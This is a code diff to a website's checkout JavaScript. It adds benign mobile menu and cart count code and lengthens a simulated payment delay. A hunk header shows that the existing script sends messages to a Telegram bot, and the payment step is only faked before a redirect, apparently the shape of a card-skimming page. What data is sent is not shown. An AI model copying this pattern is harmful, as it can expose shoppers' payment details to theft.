@@ -353,7 +353,7 @@ function processPaymentAndRedirect(amount) {
             // Default success page for other amounts
             window.location.href = 'success_page_default.html';
         }
-    }, 10); // Simulating a short delay for the payment process
+    }, 100); // Simulating a short delay for the payment process
 }
 
 // Function to toggle terms checkbox and update checkout button state
@@ -481,3 +481,85 @@ fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
 }
 
 
+// Mobile Menu Toggle Functionality
+document.addEventListener('DOMContentLoaded', function() {
+    // Get elements
+    const mobileToggle = document.getElementById('mobile-toggle');
+    const navMenu = document.getElementById('navMenu');
+    
+    // Toggle menu when mobile button is clicked
+    if (mobileToggle && navMenu) {
+        mobileToggle.addEventListener('click', function(event) {
+            event.stopPropagation();
+            navMenu.classList.toggle('active');
+            
+            // Change icon based on menu state
+            const icon = mobileToggle.querySelector('i');
+            if (navMenu.classList.contains('active')) {
+                icon.classList.remove('fa-bars');
+                icon.classList.add('fa-times');
+            } else {
+                icon.classList.remove('fa-times');
+                icon.classList.add('fa-bars');
+            }
+        });
+    }
+    
+    // Close menu when clicking outside
+    document.addEventListener('click', function(event) {
+        if (navMenu && navMenu.classList.contains('active') && 
+            !navMenu.contains(event.target) && 
+            !mobileToggle.contains(event.target)) {
+            navMenu.classList.remove('active');
+            const icon = mobileToggle.querySelector('i');
+            if (icon) {
+                icon.classList.remove('fa-times');
+                icon.classList.add('fa-bars');
+            }
+        }
+    });
+    
+    // Handle active navigation links
+    const navLinks = document.querySelectorAll('.nav-link');
+    navLinks.forEach(link => {
+        link.addEventListener('click', function() {
+            // Remove active class from all links
+            navLinks.forEach(item => {
+                item.classList.remove('active');
+            });
+            
+            // Add active class to clicked link
+            this.classList.add('active');
+            
+            // Close mobile menu when a link is clicked
+            if (window.innerWidth < 992 && navMenu.classList.contains('active')) {
+                navMenu.classList.remove('active');
+                const icon = mobileToggle.querySelector('i');
+                if (icon) {
+                    icon.classList.remove('fa-times');
+                    icon.classList.add('fa-bars');
+                }
+            }
+        });
+    });
+    
+    // Update cart count
+    function updateCartCount(count) {
+        const cartCount = document.querySelector('.cart-count');
+        if (cartCount) {
+            cartCount.textContent = count;
+        }
+    }
+    
+    // Example: Update cart count based on localStorage or your cart system
+    // This is just a placeholder - replace with your actual cart logic
+    function initializeCart() {
+        // Example: Get cart items from localStorage or your cart system
+        const cartItems = localStorage.getItem('cartItems') ? 
+                          JSON.parse(localStorage.getItem('cartItems')) : [];
+        updateCartCount(cartItems.length);
+    }
+    
+    // Initialize cart count
+    initializeCart();
+});
